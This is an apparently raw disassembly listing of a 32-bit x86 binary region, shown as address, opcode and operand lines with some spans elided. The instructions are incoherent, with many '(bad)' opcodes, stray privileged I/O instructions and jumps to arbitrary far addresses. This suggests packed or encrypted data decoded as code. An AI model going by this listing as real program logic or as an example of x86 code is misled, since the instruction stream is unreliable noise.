  42794a:	and    eax,0xacd7689f
  42794f:	lods   al,BYTE PTR ds:[esi]
  427950:	pop    es
  427951:	ja     0x427976
  427953:	in     eax,dx
  427954:	mov    DWORD PTR [ebx+0x3],ebx
  427957:	iret   
  427958:	inc    ebx
  427959:	aam    0xb4
  42795b:	lods   al,BYTE PTR ds:[esi]
  42795c:	int3   
  42795d:	xchg   dl,al
  42795f:	ds loop 0x4279bc
  427962:	push   ebx
  427963:	cmp    eax,0xaf5e7378
  427968:	sbb    al,ch
  42796a:	sbb    al,0xcb
  42796c:	dec    esp
  42796d:	cmc    
  42796e:	lahf   
  42796f:	sar    DWORD PTR [ecx*2+0x21382046],0x87
  427977:	sub    eax,DWORD PTR [esi-0x3c8914f0]
  42797d:	sbb    esi,DWORD PTR [ebx+0x7eb022a3]
  427983:	jno    0x4279d0
  427985:	mov    ah,0xed
  427987:	cmp    eax,0xdc510b0
  42798c:	sub    al,0x28
  42798e:	stc    
  42798f:	adc    al,BYTE PTR [eax]
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x41e2a740]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	jl     0x4279dc
  427a0e:	loop   0x4279e3
  427a10:	fwait
  427a11:	cwde   
  427a12:	mov    ecx,0x13a6f64c
  427a17:	scas   eax,DWORD PTR es:[edi]
  427a18:	imul   esi,DWORD PTR [ebx+ecx*2+0x2],0xffffffe7
  427a1d:	pop    ecx
  427a1e:	fs sub edi,ecx
  427a21:	xor    cl,BYTE PTR [ebx+0x10]
  427a24:	xchg   esp,eax
  427a25:	sbb    DWORD PTR [ecx+edx*1+0x17af2f27],esi
  427a2c:	or     BYTE PTR [ebp+0x2293b28c],cl
  427a32:	or     dh,BYTE PTR [ebp+0x2]
  427a35:	cmp    eax,0xdbac3607
  427a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a3b:	pop    ebp
  427a3c:	fistp  QWORD PTR [eax+0xa62e860]
  427a42:	sbb    eax,0xbe3cb0d8
  427a47:	xor    eax,0x2b28f9ad
  427a4c:	adc    esi,eax
  427a4e:	pop    ecx
  427a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a50:	adc    esp,edx
  427a52:	jo     0x427aa9
  427a54:	or     BYTE PTR [ebx],ch
  427a56:	and    ah,BYTE PTR ss:[ebx]
  427a59:	icebp  
  427a5a:	jecxz  0x427a20
  427a5c:	xchg   esp,eax
  427a5d:	pop    ebx
  427a5e:	mov    WORD PTR [edx],es
  427a60:	or     ebp,DWORD PTR [eax]
  427a62:	shl    DWORD PTR [edx-0x6ce2aa73],1
  427a68:	or     DWORD PTR [ecx],0x7a
  427a6b:	dec    edx
  427a6c:	aaa    
  427a6d:	mov    ah,0xd
  427a6f:	ds cld 
  427a71:	test   esi,edx
  427a73:	dec    eax
  427a74:	add    eax,0x50c6ecd4
  427a79:	(bad)  
  427a7a:	ficomp DWORD PTR [esi+ecx*1+0x3a209723]
  427a81:	xor    edi,esp
  427a83:	outs   dx,BYTE PTR ds:[esi]
  427a84:	cmp    al,0x47
  427a86:	cwde   
  427a87:	adc    DWORD PTR [esi],edx
  427a89:	mov    esi,ebp
  427a8b:	fdiv   QWORD PTR [ebp+0x2a]
  427a8e:	iret   
  427a8f:	pusha  
  427a90:	stc    
  427a91:	call   0x7283:0x584e6340
  427a98:	cmp    eax,0xe86fb5c0
  427a9d:	inc    edi
  427a9e:	dec    esi
  427a9f:	shl    ecx,0x52
  427aa2:	add    DWORD PTR [ebp+0x6a],esp
  427aa5:	jb     0x427a2f
  427aa7:	push   cs
  427aa8:	pop    ds
  427aa9:	or     al,0x73
  427aab:	adc    al,0x49
  427aad:	jle    0x427a38
  427aaf:	lods   al,BYTE PTR ds:[esi]
  427ab0:	cs xor bh,al
  427ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ab4:	(bad)  
  427ab5:	xor    eax,0x2d86d2d4
  427aba:	cmp    al,ch
  427abc:	stos   DWORD PTR es:[edi],eax
  427abd:	jmp    0x427a90
  427abf:	push   cs
  427ac0:	jp     0x427ade
  427ac2:	call   0x3c6eefa3
  427ac7:	sbb    ebp,ebp
  427ac9:	mov    edi,0x2ac8ae17
  427ace:	mov    dl,0x45
  427ad0:	dec    eax
  427ad1:	push   ebp
  427ad2:	daa    
  427ad3:	pop    ebp
  427ad4:	dec    esp
  427ad5:	adc    cl,BYTE PTR es:[ebx]
  427ad8:	retf   
  427ad9:	scas   al,BYTE PTR es:[edi]
  427ada:	inc    edi
  427adb:	xor    al,0xb8
  427add:	cli    
  427ade:	mov    DWORD PTR [esi],edi
  427ae0:	mov    esi,0x46a538f3
  427ae5:	test   al,0xa7
  427ae7:	sub    BYTE PTR [edx+esi*2+0x3b],dl
  427aeb:	lea    esp,cs:[edx+eiz*4]
  427aef:	lods   eax,DWORD PTR ds:[esi]
  427af0:	jns    0x427b46
  427af2:	cmp    al,0xd8
  427af4:	cmp    edx,DWORD PTR [esi+0xa]
  427af7:	dec    ebx
  427af8:	sub    al,0x22
  427afa:	pop    ebp
  427afb:	sub    al,0xc2
  427afd:	sbb    al,0xaa
  427aff:	fisttp DWORD PTR [ebp+esi*8-0x26ce4e7e]
  427b06:	stc    
  427b07:	std    
  427b08:	cs jecxz 0x427b24
  427b0b:	pop    ecx
  427b0c:	xlat   BYTE PTR ds:[ebx]
  427b0d:	cld    
  427b0e:	fadd   st(6),st
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	neg    ah
  427b81:	ja     0x427b40
  427b83:	jb     0x427bad
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	mov    bl,0x86
  427b8e:	ss jne 0x427b56
  427b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b92:	leave  
  427b93:	and    BYTE PTR [edx-0x76],bh
  427b96:	jge    0x427b88
  427b98:	push   0x3
  427b9a:	xchg   edi,eax
  427b9b:	rcl    DWORD PTR [edx+0x19],0x12
  427b9f:	xchg   esp,eax
  427ba0:	mov    al,0xd8
  427ba2:	cmp    ecx,esi
  427ba4:	test   al,0x5c
  427ba6:	int3   
  427ba7:	jg     0x427b3d
  427ba9:	jae    0x427bcd
  427bab:	xor    eax,0x4fbf204b
  427bb0:	mov    ds:0x43fea2a2,eax
  427bb5:	mov    ch,0x7b
  427bb7:	out    0x75,al
  427bb9:	scas   eax,DWORD PTR es:[edi]
  427bba:	jmp    0x4836ba97
  427bbf:	inc    edi
  427bc0:	call   0xa870d0c0
  427bc5:	into   
  427bc6:	stos   DWORD PTR es:[edi],eax
  427bc7:	pop    es
  427bc8:	sub    al,ch
  427bca:	test   al,bh
  427bcc:	adc    BYTE PTR [ebx+ebp*8],dl
  427bcf:	pop    ecx
  427bd0:	cmp    ch,BYTE PTR [ebp+eiz*1+0x12b5060]
  427bd7:	inc    edx
  427bd8:	mov    ecx,0x572a82fe
  427bdd:	sub    ch,BYTE PTR [edx+0x9]
  427be0:	scas   al,BYTE PTR es:[edi]
  427be1:	mov    ecx,0xabeb6c6d
  427be6:	or     BYTE PTR [ebp-0x221c4fe],ch
  427bec:	jp     0x427c5b
  427bee:	neg    BYTE PTR [ebx+0x11]
  427bf1:	mov    esi,0x62f7217c
  427bf6:	cmp    eax,DWORD PTR [eax-0x3a9c6a97]
  427bfc:	dec    esp
  427bfd:	jno    0x427c19
  427bff:	js     0x427bd4
  427c01:	addr16 sub al,0xe4
  427c04:	mov    ebx,0x4fa55cff
  427c09:	xlat   BYTE PTR ds:[ebx]
  427c0a:	(bad)  
  427c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c0c:	loop   0x427c29
  427c0e:	xchg   edi,eax
  427c0f:	retf   0xc78d
  427c12:	addr16 sbb eax,0x2faac4cc
  427c18:	sbb    BYTE PTR [ebp+0x77],0x62
  427c1c:	rol    DWORD PTR [esi+ebp*1-0x66d8cca8],0xcd
  427c24:	in     eax,dx
  427c25:	enter  0x5f3f,0xf8
  427c29:	ja     0x427c23
  427c2b:	cmp    cl,BYTE PTR [edx+0x19]
  427c2e:	cmp    ebp,DWORD PTR [edx+0x1294b3]
  427c34:	mov    ds:0xbab61ee5,al
  427c39:	cmp    DWORD PTR [edi],eax
  427c3b:	sub    ah,cl
  427c3d:	sahf   
  427c3e:	push   esi
  427c3f:	test   eax,0x557f0ee6
  427c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c45:	push   cs
  427c46:	xor    cl,BYTE PTR [eax+ecx*1-0x36db6e17]
  427c4d:	sub    al,0x47
  427c4f:	scas   al,BYTE PTR es:[edi]
  427c50:	jnp    0x427c6d
  427c52:	adc    bl,BYTE PTR [ebp-0x6a442a56]
  427c58:	sub    eax,0xb0d929e2
  427c5d:	pop    edi
  427c5e:	out    dx,eax
  427c5f:	(bad)  
  427c60:	shr    bl,cl
  427c62:	loopne 0x427c80
  427c64:	cmp    BYTE PTR [esi+0x67f3b888],bh
  427c6a:	pusha  
  427c6b:	xor    al,0x53
  427c6d:	add    al,0xaa
  427c6f:	pop    edx
  427c70:	sbb    DWORD PTR [ebp-0x28],esi
  427c73:	push   ss
  427c74:	(bad)  
  427c75:	push   eax
  427c76:	xchg   edi,eax
  427c77:	lahf   
  427c78:	xchg   ebx,eax
  427c79:	hlt    
  427c7a:	loop   0x427c5b
  427c7c:	xchg   ebp,eax
  427c7d:	or     DWORD PTR [eax],esp
  427c7f:	xchg   ecx,eax
  427c80:	mov    bh,0x6d
  427c82:	add    ebx,ecx
  427c84:	out    dx,al
  427c85:	out    0x1,al
  427c87:	xor    eax,0x272ec5ba
  427c8c:	in     al,dx
  427c8d:	xor    al,al
  427c8f:	adc    DWORD PTR [eax],eax
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x97485d44,ebx
  427d02:	xchg   edx,eax
  427d03:	pop    esp
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	sbb    DWORD PTR [ebp+0x7],edi
  427d0f:	lock test al,0x8d
  427d12:	loop   0x427d4f
  427d14:	cmp    bl,0xc9
  427d17:	clc    
  427d18:	in     al,dx
  427d19:	jb     0x427d77
  427d1b:	sti    
  427d1c:	int3   
  427d1d:	mov    edi,0x92e1a915
  427d22:	leave  
  427d23:	jo     0x427cf5
  427d25:	sub    DWORD PTR [edx-0xff7fbab],esp
  427d2b:	inc    edx
  427d2c:	imul   esp,DWORD PTR [esi-0x14],0xbd82f5a0
  427d33:	(bad)  
  427d35:	mov    dh,0x9a
  427d37:	inc    ebp
  427d38:	xchg   ebx,eax
  427d39:	imul   esp,DWORD PTR [ebx+0x51c5694],0x2e4d8431
  427d43:	and    bl,ch
  427d45:	lods   al,BYTE PTR ds:[esi]
  427d46:	cmp    al,0x6b
  427d48:	lock mov ah,0xb7
  427d4b:	pop    ecx
  427d4c:	cmc    
  427d4d:	cli    
  427d4e:	clc    
  427d4f:	pop    ds
  427d50:	add    al,0xae
  427d52:	push   eax
  427d53:	mov    edx,0xe624bdf7
  427d58:	jo     0x427d0a
  427d5a:	inc    esi
  427d5b:	xor    DWORD PTR [edi-0x7f],ecx
  427d5e:	sbb    eax,0x392a705c
  427d63:	cli    
  427d64:	fldenv [ecx-0x45]
  427d67:	adc    ebx,DWORD PTR [ebx-0x547dd000]
  427d6d:	not    BYTE PTR [ecx+0x1c2de297]
  427d73:	dec    edx
  427d74:	push   esi
  427d75:	adc    al,0x3d
  427d77:	js     0x427d79
  427d79:	or     al,0x7f
  427d7b:	push   esi
  427d7c:	push   0x9431b46d
  427d81:	test   DWORD PTR [ebp-0x26bb0d0e],0x773529e9
  427d8b:	mov    dh,0xda
  427d8d:	xchg   DWORD PTR [edi],eax
  427d8f:	and    al,0x8e
  427d91:	rcl    DWORD PTR [ebx-0x45],0xa2
  427d95:	icebp  
  427d96:	jmp    0x4df6:0x42942a00
  427d9d:	pop    es
  427d9e:	and    BYTE PTR [ebp+edx*8+0x53],dh
  427da2:	and    al,0x4c
  427da4:	js     0x427dcc
  427da6:	popa   
  427da7:	and    DWORD PTR [ecx],eax
  427da9:	mov    cl,0x21
  427dab:	leave  
  427dac:	add    DWORD PTR [ebp+eiz*4-0x55b18546],0x711579de
  427db7:	cmp    al,0xcb
  427db9:	cdq    
  427dba:	out    dx,al
  427dbb:	stc    
  427dbc:	mov    ds:0xc045f1dd,al
  427dc1:	scas   al,BYTE PTR es:[edi]
  427dc2:	retf   
  427dc3:	shl    al,cl
  427dc5:	call   0x61c2:0x836d793a
  427dcc:	cmc    
  427dcd:	push   esp
  427dce:	fimul  DWORD PTR [edi]
  427dd0:	dec    edi
  427dd1:	cwde   
  427dd2:	test   eax,0x5483c365
  427dd7:	aaa    
  427dd8:	pop    DWORD PTR [eax]
  427dda:	popa   
  427ddb:	sbb    eax,0x50cb0d69
  427de0:	inc    esi
  427de1:	sbb    ecx,DWORD PTR [ecx-0x8]
  427de4:	sbb    dh,BYTE PTR [eax+0x3032bda8]
  427dea:	inc    ecx
  427deb:	ss inc ebp
  427ded:	mov    esi,0x6f2f8467
  427df2:	inc    edi
  427df3:	shl    ch,cl
  427df5:	adc    dl,dh
  427df7:	jnp    0x427dea
  427df9:	jp     0x427e0e
  427dfb:	mov    ch,BYTE PTR [edx-0x56745d82]
  427e01:	rcl    BYTE PTR [ecx+ecx*2-0x6b],0x63
  427e06:	retf   0x6730
  427e09:	in     al,0xd1
  427e0b:	outs   dx,DWORD PTR ds:[esi]
  427e0c:	mov    ds:0x5ac4f9,al
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	push   eax
  427e81:	or     cl,BYTE PTR [ebx*1+0x1aa30]
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	xor    DWORD PTR [ebx-0x3d2ffe3e],eax
  427e92:	adc    cl,ah
  427e94:	sub    ebx,esp
  427e96:	out    dx,eax
  427e97:	inc    ebp
  427e99:	jmp    0x1726f357
  427e9e:	and    BYTE PTR [esp+ecx*4-0x2b40a0e1],cl
  427ea5:	or     al,0x39
  427ea7:	sbb    edx,DWORD PTR [ebp+0xa]
  427eaa:	cmc    
  427eab:	jge    0x427ec0
  427ead:	dec    ebp
  427eae:	jae    0x427f2e
  427eb0:	jnp    0x427ed9
  427eb2:	xor    BYTE PTR [ebx-0x1a],bh
  427eb5:	mov    dl,0xd3
  427eb7:	jbe    0x427ed7
  427eb9:	inc    esp
  427eba:	and    ch,dl
  427ebc:	mov    BYTE PTR [ebx+0x79],ah
  427ebf:	mov    ebx,0xf3b538c
  427ec4:	or     eax,DWORD PTR [ebp-0x2d636141]
  427eca:	xchg   ecx,eax
  427ecb:	(bad)  
  427ecd:	dec    ebx
  427ece:	fnstenv [ebp+0x5236424e]
  427ed4:	inc    eax
  427ed5:	gs ret 
  427ed7:	out    dx,eax
  427ed8:	scas   al,BYTE PTR es:[edi]
  427ed9:	aas    
  427eda:	pshufw mm7,QWORD PTR [eax+0x27],0x7f
  427edf:	cs daa 
  427ee1:	push   0x92d13a7
  427ee6:	test   BYTE PTR [eax-0x371412ea],dl
  427eec:	iret   
  427eed:	cmp    dl,BYTE PTR [ebx-0x44]
  427ef0:	adc    ebx,eax
  427ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ef3:	rcr    edi,0x7f
  427ef6:	sub    bh,BYTE PTR [ecx]
  427ef8:	pushf  
  427ef9:	pop    ds
  427efa:	inc    edx
  427efb:	dec    ecx
  427efc:	push   ss
  427efd:	xchg   ebx,eax
  427efe:	and    BYTE PTR [edi],ah
  427f00:	mov    WORD PTR [eax],?
  427f02:	pop    ecx
  427f03:	repnz pop esi
  427f05:	xor    al,0xa8
  427f07:	out    0xb5,al
  427f09:	dec    ebp
  427f0a:	jae    0x427f45
  427f0c:	loop   0x427f29
  427f0e:	fld    st(5)
  427f10:	push   ds
  427f11:	pop    edx
  427f12:	rol    BYTE PTR [eax-0x17679ec6],cl
  427f18:	mov    al,ds:0x55f80a4d
  427f1d:	xchg   edi,eax
  427f1e:	fild   QWORD PTR fs:[ebx]
  427f21:	ffree  st(2)
  427f23:	and    al,0x30
  427f25:	mov    WORD PTR [eax],es
  427f27:	dec    ebp
  427f28:	sub    ah,BYTE PTR [eax]
  427f2a:	es push esi
  427f2c:	int3   
  427f2d:	in     al,0x62
  427f2f:	hlt    
  427f30:	fist   WORD PTR [eax+edi*4+0x2abbe53b]
  427f37:	push   esp
  427f38:	xchg   ecx,eax
  427f39:	push   eax
  427f3a:	xchg   ebx,eax
  427f3b:	push   ebx
  427f3c:	arpl   WORD PTR [edx],ax
  427f3e:	xlat   BYTE PTR ds:[ebx]
  427f3f:	sbb    eax,0x58e2b65a
  427f44:	cmc    
  427f45:	xor    al,0x1c
  427f47:	adc    al,0xbb
  427f49:	retf   
  427f4a:	call   0x97a2:0xf7ad864e
  427f51:	cmp    esi,edx
  427f53:	leave  
  427f54:	gs in  al,dx
  427f56:	cwde   
  427f57:	dec    ecx
  427f58:	inc    edx
  427f59:	mov    ebx,DWORD PTR [ebx]
  427f5b:	pop    eax
  427f5c:	call   0x28ec7b11
  427f61:	inc    esi
  427f62:	and    BYTE PTR [esi-0x6e],0xe1
  427f66:	and    al,ch
  427f68:	dec    esp
  427f69:	xor    DWORD PTR [ecx+0x54f0c847],edi
  427f6f:	js     0x427f69
  427f71:	xchg   ecx,eax
  427f72:	add    BYTE PTR cs:[ebx-0x3],al
  427f76:	sbb    BYTE PTR [esi-0x43],bh
  427f79:	pop    ecx
  427f7a:	fs mov esp,0x31959aab
  427f80:	xchg   ecx,eax
  427f81:	(bad)  
  427f82:	adc    al,0x17
  427f84:	mov    cl,0x84
  427f86:	aam    0x5e
  427f88:	sbb    DWORD PTR [ebx],eax
  427f8a:	xlat   BYTE PTR ds:[ebx]
  427f8b:	mov    ebp,0xb6fcc510
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	lahf   
  428001:	cmp    BYTE PTR [edx+0x8],dl
  428004:	xor    al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	inc    eax
  42800d:	xchg   ebx,eax
  42800e:	out    dx,al
  42800f:	fucomip st,st(5)
  428011:	mov    al,0xd3
  428013:	retf   
  428014:	rcl    BYTE PTR [ecx-0x3a],1
  428017:	jae    0x42802f
  428019:	ret    0x72ce
  42801c:	addr16 retf 0xa900
  428020:	aas    
  428021:	ror    bl,0x6d
  428024:	mov    esp,0xb9636801
  428029:	sahf   
  42802a:	or     edx,edi
  42802c:	mov    dl,0x7b
  42802e:	ret    0xe6de
  428031:	rcr    DWORD PTR [edi-0x1f],1
  428034:	clc    
  428035:	inc    edi
  428036:	sub    bl,BYTE PTR [edi+0x6e]
  428039:	retf   0x1786
  42803c:	mov    bl,0x2d
  42803e:	je     0x427fd7
  428040:	xchg   ebx,eax
  428041:	dec    eax
  428042:	mov    bl,0xf8
  428044:	inc    ebp
  428045:	jmp    0x1fb0a2db
  42804a:	scas   eax,DWORD PTR es:[edi]
  42804b:	add    dh,dh
  42804d:	and    dh,dl
  42804f:	sub    eax,0xe94ab1a1
  428054:	sub    DWORD PTR [ebx-0x15defc2e],ebx
  42805a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42805b:	int3   
  42805c:	jmp    0x735e:0xfb08392
  428063:	xor    BYTE PTR [esi-0x3],al
  428066:	xor    bl,BYTE PTR ds:0x6f381602
  42806c:	mov    esi,0xee7a8a8e
  428071:	or     ebx,DWORD PTR [ebp-0x60]
  428074:	pop    ecx
  428075:	aam    0xdc
  428077:	out    dx,al
  428078:	dec    ecx
  428079:	pop    ds
  42807a:	or     eax,0xc87e4664
  42807f:	and    DWORD PTR [ebp+0x10d79e5a],ebx
  428085:	mov    ecx,DWORD PTR [eax]
  428087:	or     ah,bh
  428089:	inc    esi
  42808a:	rol    BYTE PTR [ecx],1
  42808c:	out    0x27,eax
  42808e:	or     DWORD PTR [edi-0x244eaffc],esi
  428094:	pop    esp
  428095:	sahf   
  428096:	loop   0x42807f
  428098:	call   FWORD PTR [eax+0x27]
  42809b:	in     eax,dx
  42809c:	(bad)  
  42809d:	pop    esp
  42809e:	lea    ebp,[esi]
  4280a0:	imul   edi,DWORD PTR [edx+0x7f2bb50d],0xfffffff4
  4280a7:	adc    ebx,DWORD PTR [edi-0x24]
  4280aa:	jb     0x42812a
  4280ac:	jmp    0x4771:0xd67b8b39
  4280b3:	mov    bl,0xf0
  4280b5:	lock js 0x4280a8
  4280b8:	inc    ebx
  4280b9:	mov    esp,fs
  4280bb:	fiadd  WORD PTR [ebx-0x21]
  4280be:	fldcw  WORD PTR [esp+edi*2]
  4280c1:	dec    ebp
  4280c2:	sbb    eax,0x9ca0e276
  4280c7:	xor    al,0xf8
  4280c9:	ja     0x4280e5
  4280cb:	pop    esi
  4280cc:	les    esp,FWORD PTR [edx]
  4280ce:	sti    
  4280cf:	mov    ds,WORD PTR [eax-0x7b]
  4280d2:	push   es
  4280d3:	inc    ebx
  4280d4:	add    bh,bl
  4280d6:	cmp    BYTE PTR [edi-0xc],bl
  4280d9:	mov    bl,0xa1
  4280db:	(bad)  
  4280dc:	call   0xc91a:0x6c4a7213
  4280e3:	out    0x2,al
  4280e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280e6:	rcr    DWORD PTR [edi-0x65],0xe
  4280ea:	jl     0x428092
  4280ec:	fidivr WORD PTR ds:0xcc6d9821
  4280f2:	jb     0x428159
  4280f4:	cmp    eax,0xe322058a
  4280f9:	mov    bh,0x91
  4280fb:	int3   
  4280fc:	xor    edx,DWORD PTR [edi-0x4f]
  4280ff:	js     0x4280c5
  428101:	and    DWORD PTR [edi+0x1a9f48ec],ecx
  428107:	push   eax
  428108:	(bad)  
  428109:	icebp  
  42810a:	gs cwde 
  42810c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42810d:	or     BYTE PTR [edx+0x6f],cl
	...
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	mov    BYTE PTR [ebx-0x28],dl
  428183:	push   eax
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    BYTE PTR [eax-0x15df202],bh
  428191:	imul   ecx,DWORD PTR [ebp+0x2a8fd502],0x11d4a632
  42819b:	or     eax,0x22ba3c6d
  4281a0:	sti    
  4281a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281a2:	(bad)  
  4281a3:	int3   
  4281a4:	or     ax,WORD PTR [edi+0x316ec325]
  4281ab:	ror    ebp,cl
  4281ad:	imul   edi,edx,0x56
  4281b0:	loop   0x4281b7
  4281b2:	jmp    0x52d2:0xe65e4ff3
  4281b9:	call   0xa7acd259
  4281be:	scas   eax,DWORD PTR es:[edi]
  4281bf:	mov    ss,edx
  4281c1:	inc    ebp
  4281c2:	sub    DWORD PTR [ecx-0x17],edx
  4281c5:	or     bh,0x4f
  4281c8:	dec    ecx
  4281c9:	cmp    DWORD PTR [ecx-0x2e32b107],0x5c
  4281d0:	retf   0x55ee
  4281d3:	cmp    esi,DWORD PTR [edx]
  4281d5:	fs loopne 0x428170
  4281d8:	fdivp  st(3),st
  4281da:	and    edx,0x1c
  4281dd:	jnp    0x4281b6
  4281df:	xor    BYTE PTR [edi-0x1d],0x6
  4281e3:	lahf   
  4281e4:	xchg   esi,eax
  4281e5:	mov    ebx,0xc4956a8e
  4281ea:	cwde   
  4281eb:	dec    ebp
  4281ec:	xchg   edi,eax
  4281ed:	inc    edx
  4281ee:	and    DWORD PTR [ecx+0x670b0d76],edi
  4281f4:	scas   eax,DWORD PTR es:[edi]
  4281f5:	sub    al,0x5f
  4281f7:	mov    eax,0x8d4ddad4
  4281fc:	add    al,0x86
  4281fe:	push   edi
  4281ff:	adc    ebp,DWORD PTR [edx]
  428201:	mov    esi,0xace95699
  428206:	sahf   
  428207:	push   edx
  428208:	inc    ebx
  428209:	and    esi,DWORD PTR [edi+0x159775aa]
  42820f:	call   0x99542a2a
  428214:	xchg   edi,eax
  428215:	fmul   QWORD PTR [eax+0x6c4dd75d]
  42821b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42821c:	mov    ch,0x5d
  42821e:	and    BYTE PTR [edx],cl
  428220:	push   0xd
  428222:	jecxz  0x4281fa
  428224:	ror    BYTE PTR ds:0x744d3d88,0xf9
  42822b:	fs push ebp
  42822d:	es cli 
  42822f:	inc    edx
  428230:	fcomip st,st(1)
  428232:	mov    dh,0x5d
  428234:	push   ds
  428235:	ss inc esp
  428237:	dec    DWORD PTR [esi+ebx*8]
  42823a:	and    BYTE PTR ds:0x19dd352f,al
  428240:	dec    DWORD PTR [edi-0x3f3eb0ed]
  428246:	int    0x9a
  428248:	fadd   QWORD PTR [esi-0x7215b53f]
  42824e:	fiadd  WORD PTR [esi-0xb870639]
  428254:	retf   0x4b57
  428257:	cmp    ah,dl
  428259:	outs   dx,DWORD PTR ds:[esi]
  42825a:	add    esi,eax
  42825c:	out    dx,al
  42825d:	fs ret 
  42825f:	inc    ebp
  428260:	rcr    DWORD PTR [edi-0x6536da88],cl
  428266:	fild   WORD PTR [edx+0x781bb101]
  42826c:	jns    0x428295
  42826e:	dec    BYTE PTR [esi-0x71]
  428271:	enter  0xa44e,0x91
  428275:	pop    edi
  428276:	mov    ds:0x1f6d1e83,eax
  42827b:	in     eax,dx
  42827c:	and    ebx,edx
  42827e:	loopne 0x428207
  428280:	lds    eax,FWORD PTR [esi]
  428282:	call   0x6c70:0xcd17461b
  428289:	jle    0x428265
  42828b:	mov    ds,WORD PTR [ebx+edx*2+0x3]
  42828f:	and    DWORD PTR [eax],eax
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	rol    DWORD PTR [esi],cl
  428302:	addr16 mov eax,ds:0xad3c
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	scas   eax,DWORD PTR es:[edi]
  42830d:	outs   dx,BYTE PTR ds:[esi]
  42830e:	iret   
  42830f:	jae    0x4282fb
  428311:	inc    edx
  428312:	aaa    
  428313:	test   BYTE PTR [edi+ebx*2+0x110fe36d],0x3b
  42831b:	ret    0x88
  42831e:	sar    bl,0xf9
  428321:	fmul   DWORD PTR [ebp+0x62]
  428324:	or     al,0x13
  428326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428327:	(bad)  
  428328:	xor    eax,0xedc41b43
  42832d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42832e:	jg     0x42831e
  428330:	(bad)  
  428331:	js     0x428377
  428333:	imul   esi,DWORD PTR [edx],0xdf4532e3
  428339:	enter  0x8e18,0x4f
  42833d:	adc    BYTE PTR [ebx+ebp*8],dh
  428340:	in     eax,dx
  428341:	jno    0x42839a
  428343:	popa   
  428344:	ds bswap ebp
  428347:	pop    esi
  428348:	add    DWORD PTR [ebx+ebp*8-0x57],0x924b5a03
  428350:	fiadd  WORD PTR [eax-0x8]
  428353:	les    ebp,FWORD PTR [ecx+0x77]
  428356:	jl     0x428345
  428358:	mov    esp,0x7c2a6780
  42835d:	mov    esp,0xe8238c74
  428362:	arpl   WORD PTR [eax+0x2c],cx
  428365:	pusha  
  428366:	inc    esi
  428367:	push   ebx
  428368:	int3   
  428369:	rcl    DWORD PTR [edi+ecx*8+0x23],0xb1
  42836e:	pusha  
  42836f:	lock inc ebx
  428371:	dec    DWORD PTR [esi+0x20]
  428374:	js     0x428363
  428376:	and    al,0x9c
  428378:	mov    edx,0x9239dd5a
  42837d:	leave  
  42837e:	cmc    
  42837f:	das    
  428380:	(bad)  
  428381:	push   ebp
  428382:	sbb    BYTE PTR [ebx+0x5f],ch
  428385:	push   cs
  428386:	es jmp 0x40710f1b
  42838c:	pop    DWORD PTR [ecx]
  42838e:	out    0xee,al
  428390:	retf   0xc009
  428393:	fs ins DWORD PTR es:[edi],dx
  428395:	data16 fwait
  428397:	xchg   ecx,eax
  428398:	fst    QWORD PTR [edi-0x3c97c59a]
  42839e:	cmp    DWORD PTR ds:0x58174104,0x69
  4283a5:	dec    ch
  4283a7:	cmp    eax,esi
  4283a9:	push   edx
  4283aa:	add    eax,DWORD PTR [ebx+0x42]
  4283ad:	inc    ecx
  4283ae:	out    dx,al
  4283af:	test   eax,0x52e58c09
